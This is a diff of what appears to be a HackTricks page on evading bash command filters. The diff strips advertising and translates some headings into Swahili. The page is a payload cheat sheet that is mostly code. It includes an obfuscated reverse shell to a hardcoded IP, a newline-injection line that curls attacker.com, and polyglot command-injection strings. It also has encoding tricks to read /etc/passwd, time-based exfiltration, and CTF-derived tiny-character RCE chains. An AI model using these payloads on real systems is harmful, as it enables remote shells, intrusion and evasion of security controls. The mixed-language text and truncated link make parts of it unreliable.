@@ -2,26 +2,15 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
-
 ## Common Limitations Bypasses
 
 ### Reverse Shell
-
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-
 ### Short Rev shell
-
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -29,9 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-
-### Bypass Paths and forbidden words
-
+### Kupita Njia na Maneno Yaliyokatazwa
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -91,9 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-
-### Bypass forbidden spaces
-
+### Pita maeneo yaliyokatazwa
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -120,22 +105,16 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-
-### Bypass backslash and slash
-
+### Pita nyuma ya backslash na slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-
 ### Bypass pipes
-
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-
-### Bypass with hex encoding
-
+### Bypass kwa kutumia hex encoding
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -145,36 +124,28 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-
 ### Bypass IPs
-
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-
-### Time based data exfiltration
-
+### Uhamasishaji wa data kulingana na muda
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-
-### Getting chars from Env Variables
-
+### Kupata herufi kutoka kwa Env Variables
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-
 ### DNS data exfiltration
 
-You could use **burpcollab** or [**pingb**](http://pingb.in) for example.
+Unaweza kutumia **burpcollab** au [**pingb**](http://pingb.in) kwa mfano.
 
 ### Builtins
 
-In case you cannot execute external functions and only have access to a **limited set of builtins to obtain RCE**, there are some handy tricks to do it. Usually you **won't be able to use all** of the **builtins**, so you should **know all your options** to try to bypass the jail. Idea from [**devploit**](https://twitter.com/devploit).\
-First of all check all the [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Then here you have some **recommendations**:
-
+Iwapo huwezi kutekeleza kazi za nje na una ufikiaji tu wa **seti ndogo ya builtins kupata RCE**, kuna mbinu kadhaa za kufanya hivyo. Kawaida **hutoweza kutumia zote** za **builtins**, hivyo unapaswa **kujua chaguzi zako zote** ili kujaribu kupita gerezani. Wazo kutoka [**devploit**](https://twitter.com/devploit).\
+Kwanza kabisa angalia zote [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Hapa kuna baadhi ya **mapendekezo**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -226,30 +197,22 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-
-### Polyglot command injection
-
+### Uingiliaji wa amri za polyglot
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-
-### Bypass potential regexes
-
+### Pita regexes zinazoweza kutokea
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
-
 ### Bashfuscator
-
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-
-### RCE with 5 chars
-
+### RCE na herufi 5
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -296,9 +259,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-
-### RCE with 4 chars
-
+### RCE na herufi 4
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -333,34 +294,25 @@ ln /f*
 'sh x'
 'sh g'
 ```
+## Bypass ya Read-Only/Noexec/Distroless
 
-## Read-Only/Noexec/Distroless Bypass
-
-If you are inside a filesystem with the **read-only and noexec protections** or even in a distroless container, there are still ways to **execute arbitrary binaries, even a shell!:**
+Ikiwa uko ndani ya mfumo wa faili wenye **ulinzi wa read-only na noexec** au hata katika kontena lisilo na mfumo, bado kuna njia za **kutekeleza binaries za kiholela, hata shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & other Jails Bypass
+## Bypass ya Chroot & Jails Nyingine
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## References & More
+## Marejeo & Zaidi
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
 {{#include ../../banners/hacktricks-training.md}}
